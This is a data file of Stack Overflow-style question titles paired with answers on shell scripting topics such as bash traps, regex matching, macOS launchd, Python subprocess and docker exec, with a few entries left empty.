    "get values from 'time' command via bash script [duplicate]": "See BashFAQ/032.\nAll output (stdout, stderr and time) captured in a variable:\nvar=$( { time myexec -args; } 2>&1 )\nOutput to stdout and stderr go to their normal places:\nexec 3>&1 4>&2\nvar=$( { time myexec -args 1>&3 2>&4; } 2>&1 )  # Captures time only.\nexec 3>&- 4>&-",
    "Trap function by passing arguments?": "trap lets you specify an arbitrary command (or sequence of commands), but you have to pass that command as a single argument. For example, this:\ntrap 'foo bar baz | bip && fred barney ; wilma' SIGINT\nwill run this:\nfoo bar baz | bip && fred barney ; wilma\nwhenever the shell receives SIGINT. In your case, it sounds like you want:\ntrap '<function> <arg_1> <arg_2>' SIGINT",
    "How can I assign the match of my regular expression to a variable?": "I'm surprised to not see a native bash solution here. Yes, bash has regular expressions. You can find plenty of random documentation online, particularly if you include \"bash_rematch\" in your query, or just look at the man pages. Here's a silly example, taken from here and slightly modified, which prints the whole match, and each of the captured matches, for a regular expression.\nif [[ $str =~ $regex ]]; then\n    echo \"$str matches\"\n    echo \"matching substring: ${BASH_REMATCH[0]}\"\n    i=1\n    n=${#BASH_REMATCH[*]}\n    while [[ $i -lt $n ]]\n    do\n        echo \"  capture[$i]: ${BASH_REMATCH[$i]}\"\n        let i++\n    done\nelse\n    echo \"$str does not match\"\nfi\nThe important bit is that the extended test [[ ... ]] using its regex comparision =~ stores the entire match in ${BASH_REMATCH[0]} and the captured matches in ${BASH_REMATCH[i]}.",
    "stable sort in linux": "You forgot to constrain the key fields. By default it uses until the end of the line.\nsort -k1,1 -s t.txt",
    "shell script: run a block of code in the background without defining a new function?": "#!/bin/sh\n{\n    echo \"sleeping for 5 seconds\"\n    sleep 5\n    echo \"woke up\"\n} &\necho \"waiting\"\nwait\necho \"proceed\"\nOutput\n$ ./bgblock\nwaiting\nsleeping for 5 seconds\nwoke up\nproceed",
    "xargs to execute a string - what am I doing wrong?": "eval is a shell builtin command, not a standalone executable. Thus, xargs cannot run it directly. You probably want:\nls -1 | gawk '{print \"`mv \"$0\" \"tolower($0)\"`\"}' | xargs -i -t sh -c \"{}\"",
    "Run a script only at shutdown (not log off or restart) on Mac OS X": "Few days ago I published on github a configuration/script able to be executed at boot/shutdown.\nBasically on Mac OS X you could/should use a System wide and per-user daemon/agent configuration file (plist) in conjunction with a bash script file. This is a sample of the plist file you could use:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key><string>boot.shutdown.script.name</string>\n\n<key>ProgramArguments</key>\n<array>\n  <string>SCRIPT_PATH/boot-shutdown.sh</string>\n</array>\n\n<key>RunAtLoad</key>\n<true/>\n\n<key>StandardOutPath</key>\n<string>LOG_PATH/boot-shutdown.log</string>\n\n<key>StandardErrorPath</key>\n<string>LOG_PATH/boot-shutdown.err</string>\n\n</dict>\n</plist>\nYou can place this file into /Library/LaunchDaemons. There are many directories where the plist file could be placed, it depends from what you need, the rights of the process and so on.\n~/Library/LaunchAgents         Per-user agents provided by the user.\n/Library/LaunchAgents          Per-user agents provided by the administrator.\n/Library/LaunchDaemons         System wide daemons provided by the administrator.\n/System/Library/LaunchAgents   Mac OS X Per-user agents.\n/System/Library/LaunchDaemons  Mac OS X System wide daemons.\nThis script boot-shutdown.sh will be loaded and executed at every boot/shutdown.\n#!/bin/bash\nfunction shutdown()\n{\n\n  # INSERT HERE THE COMMAND YOU WANT EXECUTE AT SHUTDOWN OR SERVICE UNLOAD\n\n  exit 0\n}\n\nfunction startup()\n{\n\n  # INSERT HERE THE COMMAND YOU WANT EXECUTE AT STARTUP OR SERVICE LOAD\n\n  tail -f /dev/null &\n  wait $!\n}\n\ntrap shutdown SIGTERM\ntrap shutdown SIGKILL\n\nstartup;\nThen call launchctl command which load and unload daemons/agents.\nsudo launchctl load -w /Library/LaunchDaemons/boot-shutdown-script.plist",
    "Using curly brackets for variable expansion in makefile doesn't work": "Make uses old-school Bourne shell (/bin/sh) by default which does not support brace expansion. Set the SHELL variable in your makefile to /bin/bash if it's not already set.\nJust add a line in the top of your makefile with:\nSHELL=/usr/bin/bash\n(please confirm your bash path).",
    "Linux/Bash: How to unquote?": "Try xargs:\n$ echo $x\n'a b' 'c'\n\n$ echo $x | xargs ./echo\nargc = 3\nargv[0] = ./echo\nargv[1] = a b\nargv[2] = c",
    "Using apple's Automator to pass filenames to a shell script": "You're correct when you say you're \"not using stdin correctly\". In fact, from the script snippet you provided, your script assumes you're getting the files as arguments on the command line ... you're not using stdin at all!\nIn the top right corner of the Run Shell Script action, below the X is a drop down box with 2 options: 'Pass input: to stdin' and 'Pass intput: as arguments'. These options dictate how the selected files are passed to your script action. If the option 'as arguments' is selected, your script should use the following template\nfor f in \"$@\"; do\n# so stuff here\ndone\nThis template is provided by the action itself when 'as arguments' is selected.\nOn the other hand, if the 'to stdin' option is selected, then you script should use this tamplate:\nwhile read fname; do  # read each line - assumes one file name per line\n   # do clever stuff with the filename\n   echo $fname # to illustrate we'll simply copy the filename to stdout\ndone\n(In the event you don't know bash scripting, everything after the # on a line is a comment)\nNote that the template provided by the script action is the simple, single command\ncat\nNot very helpful in my opinion.\nNote that until you actually enter text into script area, changing between 'to stdin' and 'as arguments' will change the contents of the script box (I assume this is a hint to what your script should look like) but once you enter something, the switching no longer happens.",
    "Creating Route53 Record Sets via Shell Script": "",
    "find full path given partial path": "Use the -path option:\nfind . -path '*/folder1/subfolder2/*'",
    "Write to Mac OS X Console logs from shell script or command line [closed]": "syslog -s -l error \"message to send\"\nwill log the message as something like\nMay 29 17:15:09 hostname syslog[22316]: message to send\nYou can customize things by using -k, which expects a list of alternating keys and values, for example\nsyslog -s -k Facility com.apple.console \\\n             Level Error \\\n             Sender MyScript \\\n             Message \"script says hello\"\nwould produce\nMay 29 17:22:21 hostname MyScript[22343]: script says hello\n(setting the Facility to com.apple.console makes it a \"console\" message, equivalent to stdout output from a double-clicked bundled application, and retrievable using syslog -C)",
    "How does the keyword \u201cif\u201d test if a value is true or false?": "The return value of a command is checked. [ 1 ] has a return value of 0 (true). Any other return value (like 1) indicates an error.\nYou can display the return value of the last executed command using the $? variable:\ntrue\necho $?\n# returned 0\nfalse\necho $?\n# returned 1\necho $?\n# returned 0 as the last executed command is 'echo', and not 'false'",
    "How to create directory if doesn't exists in sftp": "man 1 sftp (from openssh-client package):\n-b batchfile\n\n    Batch mode reads a series of commands from an input\n    batchfile instead of stdin. Since it lacks user\n    interaction it should be used in conjunction with\n    non-interactive authentication. A batchfile of \u2018-\u2019\n    may be used to indicate standard input. sftp will\n    abort if any of the following commands fail: get,\n    put, reget, reput, rename, ln, rm, mkdir, chdir, ls,\n    lchdir, chmod, chown, chgrp, lpwd, df, symlink, and\n    lmkdir. Termination on error can be suppressed on a\n    command by command basis by prefixing the command\n    with a \u2018-\u2019 character (for example, -rm /tmp/blah*).\nSo:\n{\n  echo -mkdir dir1\n  echo -mkdir dir1/dir2\n  echo -mkdir dir1/dir2/dir3\n} | sftp -b - $user@$host",
    "Write current date/time to a file using shell script": "Use date >> //home/user/Desktop/Scripts/Date Logs/datelog.txt.\nLike i tried in my system :-\ndate > /tmp/date.txt. And file contains Wed Apr 5 09:27:37 IST 2017.\n[Edit] There are difference between >>(appending to the file) and >(Create the new file)\nEdit:- As suggested by chepner, you can directly redirect the o/p of date command to file using date >> /tmp/date.txt.",
    "imagemagick autonumber starting from 1": "I have never tried this but remember reading something about -scene.\nconvert '*.jpg' -resize 256 -scene 1 small/image_%02d.jpg\n-scene value\nset scene number.\nThis option sets the scene number of an image or the first image in an image sequence.",
    "How to get full path from \"../\" on command line in Linux shell script": "You want readlink -f.\n$ cd /tmp\n$ readlink -f ..\n/",
    "How do I fetch the folder icon on Windows 7 using Shell32.SHGetFileInfo": "You shouldn't specify null as yur first parameter to SHGeFileInfo. Use the path to a folder instead (please note that some folders have different (non-standard) icons). You could use the temp folder or your application's root folder for example.\nBest practise would be to get the correct icon for each folder (in other words: Change the signature of GetFolderIcon to public static Icon GetFolderIcon(string folderPath, IconSize size, FolderType folderType) and call it for each folder you display).\nThere seems to be an open source library which already has a managed wrapper for fetching folder icons. Found on PInvoke.net (the entry for SHGetFileInfo):\nHowever, this does not work if you want an icon of a drive or folder.\nIn that case, you can use the ExtendedFileInfo class provided by the ManagedWindowsApi project (http://mwinapi.sourceforge.net).\nIf you want to stick to a hand-crafted solution, this works for me (Win7 x64 RTM, .NET 3.5 SP1):\nusing System;\nusing System.Drawing;\nusing System.Runtime.InteropServices;\nusing System.Windows.Forms;\n\nnamespace IconExtractor\n{\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]\n    public struct SHFILEINFO\n    {\n        public IntPtr hIcon;\n        public int iIcon;\n        public uint dwAttributes;\n        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]\n        public string szDisplayName;\n        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]\n        public string szTypeName;\n    };\n\n    public enum FolderType\n    {\n        Closed,\n        Open\n    }\n\n    public enum IconSize\n    {\n        Large,\n        Small\n    }\n\n    public partial class Form1 : Form\n    {\n        [DllImport(\"shell32.dll\", CharSet = CharSet.Auto)]\n        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, out SHFILEINFO psfi, uint cbFileInfo, uint uFlags);\n\n        [DllImport(\"user32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        static extern bool DestroyIcon(IntPtr hIcon);\n\n        public const uint SHGFI_ICON = 0x000000100; \n        public const uint SHGFI_USEFILEATTRIBUTES = 0x000000010; \n        public const uint SHGFI_OPENICON = 0x000000002; \n        public const uint SHGFI_SMALLICON = 0x000000001; \n        public const uint SHGFI_LARGEICON = 0x000000000; \n        public const uint FILE_ATTRIBUTE_DIRECTORY = 0x00000010;\n\n        public static Icon GetFolderIcon(IconSize size, FolderType folderType)\n        {    \n            // Need to add size check, although errors generated at present!    \n            uint flags = SHGFI_ICON | SHGFI_USEFILEATTRIBUTES;    \n\n            if (FolderType.Open == folderType)    \n            {        \n                flags += SHGFI_OPENICON;    \n            }    \n            if (IconSize.Small == size)    \n            {       flags += SHGFI_SMALLICON;    \n            }     \n            else     \n            {       \n                flags += SHGFI_LARGEICON;    \n            }    \n            // Get the folder icon    \n            var shfi = new SHFILEINFO();    \n\n            var res = SHGetFileInfo(@\"C:\\Windows\",                             \n                FILE_ATTRIBUTE_DIRECTORY,                             \n                out shfi,                             \n                (uint) Marshal.SizeOf(shfi),                             \n                flags );\n\n            if (res == IntPtr.Zero)\n                throw Marshal.GetExceptionForHR(Marshal.GetHRForLastWin32Error());\n\n            // Load the icon from an HICON handle  \n            Icon.FromHandle(shfi.hIcon);    \n\n            // Now clone the icon, so that it can be successfully stored in an ImageList\n            var icon = (Icon)Icon.FromHandle(shfi.hIcon).Clone();    \n\n            DestroyIcon( shfi.hIcon );        // Cleanup    \n\n            return icon;}\n\n        public Form1()\n        {\n            InitializeComponent();\n        }\n\n        private void Form1_Load(object sender, EventArgs e)\n        {\n            try\n            {\n\n                Icon icon = GetFolderIcon(IconSize.Large, FolderType.Open);\n                pictureBox1.Image = icon.ToBitmap();\n                // Note: The image actually should be disposed somewhere\n            }\n            catch (Exception ex)\n            {\n                MessageBox.Show(ex.Message);\n            }\n        }\n    }\n}",
    "How to use declare -x in bash": "Use declare -x when you want to pass a variable to a different program, but don't want the variable to be used in global scope of the parent shell (i.e. when declaring inside a function).\nFrom the bash help:\nWhen used in a function, declare makes NAMEs local, as with the local command. The -g option suppresses this behavior.\n-x to make NAMEs export\nUsing + instead of - turns off the given attribute.\nSo declare -gx NAME=X will effectively behave the same as export NAME=X, but declare -x does not when the declare statements are inside functions.",
    "Useradd using crypt password generation": "Regarding password generation:\n32.3 Encrypting Passwords\nFunction: char * crypt (const char *key, const char *salt)\nThe crypt function takes a password, key, as a string, and a salt character array which is described below, and returns a printable ASCII string which starts with another salt. It is believed that, given the output of the function, the best way to find a key that will produce that output is to guess values of key until the original value of key is found.\nThe salt parameter does two things. Firstly, it selects which algorithm is used, the MD5-based one or the DES-based one. Secondly, it makes life harder for someone trying to guess passwords against a file containing many passwords; without a salt, an intruder can make a guess, run crypt on it once, and compare the result with all the passwords. With a salt, the intruder must run crypt once for each different salt.\nFor the MD5-based algorithm, the salt should consist of the string $1$, followed by up to 8 characters, terminated by either another $ or the end of the string. The result of crypt will be the salt, followed by a $ if the salt didn't end with one, followed by 22 characters from the alphabet ./0-9A-Za-z, up to 34 characters total. Every character in the key is significant.\nFor the DES-based algorithm, the salt should consist of two characters from the alphabet ./0-9A-Za-z, and the result of crypt will be those two characters followed by 11 more from the same alphabet, 13 in total. Only the first 8 characters in the key are significant.\nThe MD5-based algorithm has no limit on the useful length of the password used, and is slightly more secure. It is therefore preferred over the DES-based algorithm.\nWhen the user enters their password for the first time, the salt should be set to a new string which is reasonably random. To verify a password against the result of a previous call to crypt, pass the result of the previous call as the salt.\nDepending on your system, there may also be Blowfish or SHA-2 family crypts as well, and it's possible that the traditional DES may be disabled for security. PAM can add its own complications in here too.\n     ID       |    Method\n  -------------------------------\n     1        |  MD5 (Linux, BSD)\n     2a       |  Blowfish (OpenBSD)\n     md5      |  Sun MD5\n     5        |  SHA-256 (Linux, since glibc 2.7)\n     6        |  SHA-512 (Linux, since glibc 2.7)\nThat being said, the\nroot# useradd -d / -g users -p $(perl -e'print crypt(\"foo\", \"aa\")') -M -N foo\nuser$ su - foo\nPassword: foo\nfoo$ ^D\nroot# userdel foo\nworks just fine on my system.\nRegarding the shell:\n/sbin/nologin is traditional for login-disabled users. You'll have to double-check your FTP daemon's configuration to see if that excludes them from FTP access.\nRegarding the disabled account:\nAs seen above, works for me, as expected if given a working password.\nAbout the other solution:\nWhat don't you understand about the alternate solution? It seems very clear to me.\nJust pipe \"username:password\" into \"chpasswd\".\nIf you want FTP-only users, I would recommend using a FTP daemon that supports virtual users like glftpd, Pure-FTPd, ProFTPD, vsftpd, ... actually it seems that all the common ones do. This way, an FTP account does not require a real system account.",
    "Pass file content to docker exec": "there's more than one way to do it, of course; most of your invocations are close, but if you execute docker with -t it will allocate a terminal for i/o and that will interfere with stream opearations.\nMy recent invocation from shell history was :\ndocker exec -i mysql mysql -t  < t.sql\nin my case of course mysql is the running container name. You'll note that I do not pass -t to the docker exec - I do however pass it to mysql command line program that I exec on the docker host, so don't get confused there.\nThe shell that interprets that command and executes docker is also the one that opens t.sql and redirects that file descriptor to docker's stdin, so t.sql here is in the current working directory of the host shell, not the container shell.\nThat having been said, here's why yours didn't work. In the first place, as I said, the use of exec -it allocates a terminal that interferes with the stdin stream that the bash shell set up from cat. In the second place, you're really close, but path/file.sql wasn't on the docker image so I'm guessing that threw a 'no such file or directory' because file.sql is on the host, not the container, yet it's referenced within the -c parameter to the container's sh execution. Of course, that would also need -t to be removed; in neither case does a terminal need to be allocated (you already have one, and it will already be the stdout for the docker execution as it will inherit the shell's un-redirected stdout).",
    "How to copy/cut a file (not the contents) to the clipboard in Windows on the command line?": "OK, it seems the easiest way was to create a small C# tool that takes arguments and stores them in the clipboard:\nusing System;\nusing System.Windows.Forms;\nusing System.Collections.Generic;\nusing System.Collections.Specialized;\n\nnamespace File2Clip\n{\n    public class App\n    {\n        [STAThread]\n        static void Main(string[] args)\n        {\n            List<string> list = new List<string>();\n\n            string line;\n            while(!string.IsNullOrEmpty(line = Console.ReadLine())) list.Add(line);\n            foreach (string s in args) list.Add(s);\n\n            StringCollection paths = new StringCollection();\n            foreach (string s in list) {\n            Console.Write(s);\n                paths.Add( \n                    System.IO.Path.IsPathRooted(s) ? \n                      s : \n                      System.IO.Directory.GetCurrentDirectory() + \n                        @\"\\\" + s);\n            }\n            Clipboard.SetFileDropList(paths);\n        }\n    }\n}\n2017 edit: Here's a github repo with both source and binary.",
    "Python, running command line tools in parallel": "If you want to run commandline tools as separate processes, just use os.system (or better: The subprocess module) to start them asynchronously. On Unix/linux/macos:\nsubprocess.call(\"command -flags arguments &\", shell=True)\nOn Windows:\nsubprocess.call(\"start command -flags arguments\", shell=True)\nAs for knowing when a command has finished: Under unix you could get set up with wait etc., but if you're writing the commandline scripts, I'd just have them write a message into a file, and monitor the file from the calling python script.\n@James Youngman proposed a solution to your second question: Synchronization. If you want to control your processes from python, you could start them asynchronously with Popen.\np1 = subprocess.Popen(\"command1 -flags arguments\")\np2 = subprocess.Popen(\"command2 -flags arguments\")\nBeware that if you use Popen and your processes write a lot of data to stdout, your program will deadlock. Be sure to redirect all output to a log file.\np1 and p2 are objects that you can use to keep tabs on your processes. p1.poll() will not block, but will return None if the process is still running. It will return the exit status when it is done, so you can check if it is zero.\nwhile True:\n    time.sleep(60)\n    for proc in [p1, p2]:\n        status = proc.poll()\n        if status == None:\n            continue\n        elif status == 0:\n            # harvest the answers\n        else:\n            print \"command1 failed with status\", status\nThe above is just a model: As written, it will never exit, and it will keep \"harvesting\" the results of completed processes. But I trust you get the idea.",
    "Unable using Runtime.exec() to execute shell command \"echo\" in Android Java code": "",
    "Is it possible to pipe multiple commands in an 'if' statement?": "Use $(...) to capture output of a command into a string:\nif  [[ $(sudo zcat myfile1 | egrep -c 'Event 1|Event 2|Event 3') -ge 2 ]] ; then",
    "Code block usage { } in bash": "Putting the last two commands in braces makes it clear that \u201cThese are not just two additional commands that we happen to be running after the long-running process that might hang; they are, instead, integral to getting it shut down correctly before we proceed with the rest of the shell script.\u201d If the author had instead written:\ncommand &\na\nb\nc\nit would not be completely clear that a and b are just part of getting command to end correctly. By writing it like this:\ncommand & { a; b; }\nc\nthe author makes it clearer that a and b exist for the sake of getting command completely ended and cleaned up before the actual next step, c, occurs.",
    "Performance Comparison of Shell Scripts vs high level interpreted langs (C#/Java/etc.)": "Once upon a time, ye olde The Great Computer Language Shootout did include some shell scripts.\nSo, courtesy of the Internet Archive, from 2004 -\nNote the shell scripts didn't have programs for many of the tests.\n    Score Missing-Tests\n\nJava 20     1\n\nPerl 16     0\n\nPython 16   0\n\ngawk 12     6 \n\nmawk 10     6 \n\nbash 7      12  \nNote shell scripts can sometimes be small and fast :-)\n\"Reverse a file\"\n        CPU (sec)   Mem (KB)    Lines Code\n\nbash    0.0670      1464        1\n\nC gcc   0.0810    4064        59\n\nPython  0.3869    13160       6",
    "Change working directory in shell with a python script": "Others have pointed out that you can't change the working directory of a parent from a child.\nBut there is a way you can achieve your goal -- if you cd from a shell function, it can change the working dir. Add this to your ~/.bashrc:\ngo() {\n    cd \"$(python /path/to/cd.py \"$1\")\"\n}\nYour script should print the path to the directory that you want to change to. For example, this could be your cd.py:\n#!/usr/bin/python\nimport sys, os.path\nif sys.argv[1] == 'tdi': print(os.path.expanduser('~/long/tedious/path/to/tdi'))\nelif sys.argv[1] == 'xyz':  print(os.path.expanduser('~/long/tedious/path/to/xyz'))\nThen you can do:\ntdi@bayes:/home/$> go tdi\ntdi@bayes:/home/tdi$> go tdi",
    "How to write and match regular expressions in /bin/sh script?": "You can use this equivalent script in /bin/sh:\nif uname | grep -Eq '(QNX|qnx)'; then\n   printf \"what is the dev prefix to use? \"\n   read dev_prefix\n   if echo \"$dev_prefix\" | grep -Eq '^[a-z0-9_-]+@[a-z0-9_-\".\"]+:'; then\n   ...\n   fi\nfi",
    "Python: executing shell script with arguments(variable), but argument is not read in shell script": "The problem is with shell=True. Either remove that argument, or pass all arguments as a string, as follows:\nProcess=Popen('./childdir/execute.sh %s %s' % (str(var1),str(var2),), shell=True)\nThe shell will only pass the arguments you provide in the 1st argument of Popen to the process, as it does the interpretation of arguments itself. See a similar question answered here. What actually happens is your shell script gets no arguments, so $1 and $2 are empty.\nPopen will inherit stdout and stderr from the python script, so usually there's no need to provide the stdin= and stderr= arguments to Popen (unless you run the script with output redirection, such as >). You should do this only if you need to read the output inside the python script, and manipulate it somehow.\nIf all you need is to get the output (and don't mind running synchronously), I'd recommend trying check_output, as it is easier to get output than Popen:\noutput = subprocess.check_output(['./childdir/execute.sh',str(var1),str(var2)])\nprint(output)\nNotice that check_output and check_call have the same rules for the shell= argument as Popen.",
    "Lightweight GNU readline alternative": "This is an admirable goal I think :-)\nPerhaps Linenoise, libedit/editline or tecla would fit the bill?\nOf those probably libedit is the most widely used - e.g. postgreqsql client shell and various BSD utilities for Kerberos and ntp (although for the upstream sources it may not be the default line editing library for compilation due the to widespread use of libreadline on Linux). There are a couple of slightly different versions of libedit/editline as you'll see if you read some of those references and do some further research.\nCheers, and good luck with your project.",
    "head command to skip last few lines of file on MAC OSX": "GNU version of head supports negative numbers.\nbrew install coreutils\nghead -n -4 main.m",
    "Ignoring CalledProcessError": "Something like this perhaps?\ndef shell(command):\n    try:\n        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)\n    except Exception, e:\n        output = str(e.output)\n    finished = output.split('\\n')\n    for line in finished:\n        print line\n    return",
    "switch branch in git by partial name": "There are very few occasions where you'd want to checkout remotes/origin/*. They exist but for the purposes of this shortcut, let's not worry about them. This will get you what you want on OSX:\ngit config --global alias.sco '!sh -c \"git branch -a | grep -v remotes | grep $1 | xargs git checkout\"'\nYou can then issue git sco <number> to checkout a branch that includes <number> but excludes \"remotes\". You can change sco to be anything you'd like. I just picked it for \"super checkout\".\nOf course this won't work terribly well if you've got more than one branch that matches <number>. It should, however, be a decent starting point.",
    "Bash script listen for key press to move on": "you can use read builtin command with option -t and -n\nwhile :\ndo\n    # TASK 1\n    date\n    read -t 1 -n 1 key\n\n    if [[ $key = q ]]\n    then\n        break\n    fi\ndone\n\n# TASK 2\ndate +%s",
    "\"source\" command on mac": "Terminal and iTerm 2 open new shells as login shells by default. When Bash is opened as a login shell, it reads ~/.bash_profile but not ~/.bashrc.\nSee https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html:\nInvoked as an interactive login shell, or with --login\nWhen Bash is invoked as an interactive login shell, or as a non-interactive shell with the --login option, it first reads and executes commands from the file /etc/profile, if that file exists. After reading that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile, in that order, and reads and executes commands from the first one that exists and is readable. The --noprofile option may be used when the shell is started to inhibit this behavior.\nSo either:\nUse ~/.bash_profile instead of ~/.bashrc.\nUse ~/.bashrc but source ~/.bashrc from ~/.bash_profile.\nTell your terminal application to open new shells as non-login shells.\nI have done the last two. For example tmux and the shell mode in Emacs open new shells as non-login shells. I still source ~/.bashrc from ~/.bash_profile because Bash is opened as a login shell when I ssh to my computer.",
    "what does launchctl config user path do?": "The sudo launchctl config user path <...> command updates /private/var/db/com.apple.xpc.launchd/config/user.plist:\n$ cat /private/var/db/com.apple.xpc.launchd/config/user.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>PathEnvironmentVariable</key>\n    <string>/opt/homebrew/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>\n</dict>\n</plist>\nTested on my system, which is currently macOS 14.2.1 (AppleSilicon). You can replace user with system to operate on the system-wide preferences. Both require sudo, oddly enough.\nYou can query launchd's current custom PATH setting (will return an empty string if you haven't configured one) with:\nlaunchctl getenv PATH\nYou can query the default PATH by executing:\nsysctl -n user.cs_path\nTo undo any customizations, you can issue:\nsudo defaults delete /private/var/db/com.apple.xpc.launchd/config/user.plist PathEnvironmentVariable\n(requires a reboot to take effect)",
    "How to export a function in Bourne shell?": "No, it is not possible.\nThe POSIX spec for export is quite clear that it only supports variables. typeset and other extensions used for the purpose in more recent shells are just that -- extensions -- not present in POSIX.",
    "How to export a shell variable to all sessions?": "You can set up your sessions to keep rereading a file on disk by setting a trap on DEBUG in your .bashrc:\ntrap 'source ~/.myvars' DEBUG\nIf you leave a terminal A open, run echo VAR=42 >> ~/.myvars in terminal B, then switch back to terminal A and echo $VAR, it'll \"magically\" be set.",
    "Electron: run shell commands with arguments": "shell.openItem isn't designed for that.\nUse the spawn function of NodeJS from the child_process core module.\nlet spawn = require(\"child_process\").spawn;\n\nlet bat = spawn(\"cmd.exe\", [\n    \"/c\",          // Argument for cmd.exe to carry out the specified script\n    \"D:\\test.bat\", // Path to your file\n    \"argument1\",   // First argument\n    \"argumentN\"    // n-th argument\n]);\n\nbat.stdout.on(\"data\", (data) => {\n    // Handle data...\n});\n\nbat.stderr.on(\"data\", (err) => {\n    // Handle error...\n});\n\nbat.on(\"exit\", (code) => {\n    // Handle exit\n});",
    "How to safely exit early from a bash script?": "The most common solution to bail out of a script without causing the parent shell to terminate is to try return first. If it fails then exit.\nYour code will look like this:\n#! /usr/bin/bash\n# f.sh\n\nfunc()\n{\n  return 42\n}\n\nfunc\nretVal=$?\nif [ \"${retVal}\" -ne 0 ]; then\n  return ${retVal} 2>/dev/null # this will attempt to return\n  exit \"${retVal}\" # this will get executed if the above failed.\nfi\n\necho \"don't wanna reach here\"\nYou can also use return ${retVal} 2>/dev/null || exit \"${retVal}\".\nHope this helps.",
    "Failed to load native library 'libnative-platform.so' for Linux amd64": "",
    "How to redirect output of a program only if it succeeded?": "You can use it like this:\nout=$(some_command) && echo \"$out\" > outfile\necho \"$out\" > outfile will execute only when some_command succeeds.",
    "How to call a shell script and pass argument from another shell script": "By sourcing the second script with . /home/admin/script2.sh, you're effectively including it in the first script, so you get the command line arguments to the original script in $@. If you really want to call the other script with arguments, then do\n/home/admin/script2.sh \"$ARG1\" \"$ARG2\" \"$ARG3\"\n(make sure it's executable).",
    "Javascript interpreter for Linux": "You could use NodeJS. It has a child_process module that can run arbitrary commands. E.G. child_process.spawn()\nWhen your script is finished you run it like this:\nnode myscript.js",
    "How to use custom variables in gitlab ci/cd?": "",
    "How to list recently deleted files from a directory?": "You can use the debugfs utility,\ndebugfs is a simple to use RAM-based file system specially designed for debugging purposes\nFirst, run debugfs /dev/hda13 in your terminal (replacing /dev/hda13 with your own disk/partition).\n(NOTE: You can find the name of your disk by running df / in the terminal).\nOnce in debug mode, you can use the command lsdel to list inodes corresponding with deleted files.\nWhen files are removed in linux they are only un-linked but their inodes (addresses in the disk where the file is actually present) are not removed\nTo get paths of these deleted files you can use debugfs -R \"ncheck 320236\" replacing the number with your particular inode.\nInode   Pathname\n320236  /path/to/file\nFrom here you can also inspect the contents of deleted files with cat. (NOTE: You can also recover from here if necessary).\nGreat post about this here.",
    "What special meaning does an equal-sign have in zsh?": "From the docs:\n14.7.3 \u2018=\u2019 expansion\nIf a word begins with an unquoted \u2018=\u2019 and the EQUALS option is set, the remainder of the word is taken as the name of a command. If a command exists by that name, the word is replaced by the full pathname of the command.\nAnd here in more words",
    "Creating a new regex based on the returned results and rules of a previous regex | Indexing a regex and seeing how the regex has matched a substring": "",
    "Should named pipes opened with mkfifo be closed and how?": "No. Unix treats everything like a file. Named pipes are not different. If you\u2019re done using it, you probably want to close it so you don\u2019t clutter up your machine with named pipes, but you don\u2019t need to close it.\nEdited to reflect below comment, which is correct. Deleting != closing.\nYou close the named pipe the same way you close any file:\n    fclose(mFifo)\nAs mentioned in the accepted answer, closing will not delete the fifo. You may need to do that separately.\nThere\u2019s nothing wrong with re-using a named pipe. It\u2019s up to you, however, to know when you\u2019re done reading/writing to it for each iteration. Once all the data has been read out of the pipe, you\u2019re free to use it again as many times as you want.",
    "How to change Unix permissions when I don't own the file but do have write permission on the directory?": "There is at least one Unix in which I've seen a way to give someone chmod and chown permissions on all files owned by a particular group. This is sometimes called \"group superuser\" or something similar.\nThe only Unix I'm positive I've seen this on was the version of Unix that the Encore Multimax ran.\nI've searched a bit, and while I remember a few vague references to an ability of this sort in Linux, I have been unable to find them. So this may not be an option. Luckily, it can be simulated, albeit the simulation is a bit dangerous.\nThe way to simulate this is to make a very specific suid program that will do the chmod as root after checking that you are a member of the same group as owns the file, and your username is listed as having that permission in a special /etc/chmod_group file that must be owned by root and readable and writeable only by root.",
    "let vs expr vs double parenthesis arithmetic in shell": "$(( ... )) is defined in the POSIX standard, which is probably as portable as you need to be.",
    "How can I run a test suite using gradle from the command line": "The following works for me locally.\ngradle -Dtest.single=MySuite clean test\nThis actually uses a different approach (test inclusion) versus the more advanced filtering approach used by --test.\nAs documented in the referenced link, the example above works by creating a file inclusion pattern of the form **/MySuite*.class whereas --test attempts to select tests from the scanned test set. I suspect there are some unforseen interactions between the generic test filtering implemented in Gradle and the specific cases around the JUnit Suite runner.\nHaving said that, even the Gradle docs warn that the above approach is superseded, and in reality I would probably echo @Opal's comment and define an explicit task to run suites for a given phase of testing. For example the following run with gradle clean testSuite might run an integration suite.\ntask testSuite(type: Test) {\n   include 'MySuite.class'  \n}\nReferences:\nhttps://docs.gradle.org/current/userguide/java_plugin.html#test_filtering",
    "Android \"adb shell input keyevent KEYCODE_SEARCH\" Not working": "",
    "How to execute the Entrypoint of a Docker images at each \"exec\" command?": "if your goal is to run the docker exec with a specific user inside of the container, you can use the --user option.\ndocker exec --user myuser container-name [... your command here]\nIf you want to run gosu every time, you can specify that as the command with docker exec\ndocke exec container-name gosu 1000:1000 [your actual command here]\nin my experience, the best way to encapsulate this into something easily re-usable is with a .sh script (or .cmd file in windows).\ndrop this into a file in your local folder... maybe gs for example.\n#! /bin/sh\ndocker exec container-name gosu 1000:1000 \"$@\"\ngive it execute permissions with chmod +x gs and then run it with ./gs from the local folder",
    "Send SMS via adb shell service call isms Android 4.1.2": "",
